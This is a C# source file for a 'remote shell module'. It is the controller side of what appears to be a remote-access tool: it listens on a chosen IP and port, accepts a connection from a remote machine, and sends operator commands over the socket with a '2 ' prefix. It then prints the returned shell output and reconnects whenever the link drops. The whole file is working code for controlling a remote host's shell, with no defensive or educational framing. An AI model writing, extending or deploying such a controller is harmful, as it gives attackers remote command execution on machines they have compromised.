using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RemoteShell
{
    class RemoteShell
    {


        Socket tcpSocket = null;


        public TcpListener prepareReceiver(string ip, int port)
        {
            IPAddress ipaddress = IPAddress.Parse(ip);
            TcpListener listener = new TcpListener(ipaddress, port);
            try
            {
                listener.Start();
            }
            catch (Exception e) {
                System.Console.WriteLine(e.Message);
                return null;
            }
            
            System.Console.WriteLine("Bound to: " + ip + ":" + port);
            return listener;
        }

        public void receiveConnection(TcpListener listener)
        {

            while (true)
            {

                if (listener.Pending())
                {
                    tcpSocket = listener.AcceptSocket();
                    return;
                }
            }
        }





        static void Main(string[] args)
        {

            RemoteShell rShell = new RemoteShell();
            TcpListener listener = rShell.prepareReceiver(args[0], Convert.ToInt16(args[1]));
            if (listener == null) {

                System.Console.ReadKey();
                Environment.Exit(1);
            
            }

            rShell.receiveConnection(listener);
            byte[] shellResponse = new byte[1048576];
            String stringedResponse;
            bool interact = false;
            int readBytes = 0;

            while (true)
            {
                System.Console.WriteLine("Welcome to the remote shell module.");
                System.Console.WriteLine("start");
                System.Console.WriteLine("stop");
                System.Console.WriteLine("interact");
                String command = System.Console.ReadLine();

                if (!command.Equals("start") && !command.Equals("stop") && !command.Equals("interact")){

                    System.Console.WriteLine("Invalid command");
                    continue;
                }

                interact = command.Equals("interact");
                
                if (interact)
                {
                    System.Console.Write("command->");
                    String subCommand = System.Console.ReadLine();
                    command += " " + subCommand;
                }

                try
                {
                    rShell.tcpSocket.Send(Encoding.ASCII.GetBytes("2 " + command));
                }
                catch (Exception e) {
                    System.Console.WriteLine("Lost connection. Please wait...");
                    rShell.receiveConnection(listener);
                    continue;
                }

                if (interact)
                {
                    try
                    {
                        readBytes = rShell.tcpSocket.Receive(shellResponse);
                    }
                    catch (Exception e) {
                        System.Console.WriteLine("Lost connection. Please wait...");
                        rShell.receiveConnection(listener);
                        //interact = false;
                        continue;                    
                    }

                    try
                    {
                        stringedResponse = Encoding.ASCII.GetString(shellResponse, 0, readBytes);
                    }
                    catch (Exception e) {

                        System.Console.WriteLine(e.Message);
                        continue;
                    
                    }
                        
                    System.Console.WriteLine(stringedResponse);

                }
            }

        }
    }
}
